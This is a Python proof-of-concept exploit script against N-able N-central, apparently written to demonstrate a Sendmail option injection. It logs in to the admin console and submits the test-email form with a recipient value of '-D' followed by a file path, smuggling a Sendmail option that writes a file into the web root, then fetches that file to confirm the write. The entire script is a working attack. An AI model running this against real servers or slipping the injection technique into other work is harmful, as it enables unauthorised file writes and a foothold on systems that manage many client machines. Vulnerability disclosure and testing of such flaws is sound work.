#!/usr/bin/env python3
import argparse
import getpass
import os
import secrets

import requests
import urllib3


def main():
    p = argparse.ArgumentParser(description="N-central test-email Sendmail option injection")
    p.add_argument("--target", default="https://192.168.1.14:8443")
    p.add_argument("--username", default="productadmin@n-able.com")
    p.add_argument("--password", default=os.getenv("PRODUCTADMIN_PASSWORD"))
    p.add_argument("--path")
    a = p.parse_args()
    password = a.password or getpass.getpass("Password: ")
    filename = "sendmail_" + secrets.token_hex(5) + ".txt"
    path = a.path or "/opt/nable/webapps/ROOT/tmp/" + filename
    if not path.startswith("/opt/nable/webapps/ROOT/"):
        raise SystemExit("use a path under /opt/nable/webapps/ROOT for the HTTP readback")
    web_path = path.removeprefix("/opt/nable/webapps/ROOT")

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    target = a.target.rstrip("/")
    s = requests.Session()
    s.verify = False
    s.get(target + "/login", timeout=30)
    login = s.post(
        target + "/loginLoginAction.action",
        data={"username": a.username, "password": password, "customerId": "1", "soName": ""},
        allow_redirects=False,
        timeout=30,
    )
    if login.status_code != 302:
        raise SystemExit(f"login={login.status_code}")
    headers = {"X-Requested-With": "XMLHttpRequest", "ncentralTabId": "email"}
    s.get(target + "/IndexAction.action", timeout=30)
    s.get(
        target + "/refreshNavAction.action",
        headers=headers,
        params={"ncentralTabId": "email", "custId": "1", "custName": "System"},
        timeout=30,
    )
    s.get(target + "/editTestEmailDeliveryAction.action", headers=headers, params={"ncentralTabId": "email"}, timeout=30)
    response = s.post(
        target + "/saveTestEmailDeliveryAction.action",
        headers=headers,
        data={
            "ncentralTabId": "email",
            "sender": "nable@localhost",
            "recipient": "-D" + path,
            "subject": "test",
            "message": "test",
        },
        timeout=60,
    )
    created = s.get(target + web_path, timeout=30)
    print(f"login={login.status_code}")
    print(f"send={response.status_code}")
    print(f"read={created.status_code}")
    print(f"bytes={len(created.content)}")


if __name__ == "__main__":
    main()
